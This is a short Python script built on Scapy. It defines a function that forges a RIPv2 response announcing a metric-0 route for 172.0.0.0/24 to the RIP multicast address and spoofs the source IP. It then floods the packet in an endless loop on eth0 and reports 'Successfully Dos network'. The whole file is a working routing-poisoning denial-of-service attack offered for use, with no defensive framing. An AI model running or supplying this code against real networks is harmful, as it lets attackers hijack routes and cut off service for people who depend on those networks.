from scapy.all import *
def rip_ddos(ip):
	# prepare the evil packet	
	
	pkt_evil = Ether() /IP(dst="224.0.0.9") /UDP(sport=520, dport=520) /RIP(cmd=2, version=2) /RIPEntry(AF="IP", RouteTag=0,addr="172.0.0.0", mask="255.255.255.0",nextHop="0.0.0.0",metric=0)

	# spoof the source IP
	pkt_evil[IP].src = ip

	# keep sending the evil packet every second
	sendp(pkt_evil, loop=1, inter=2, iface="eth0")
	print('Successfully Dos network')
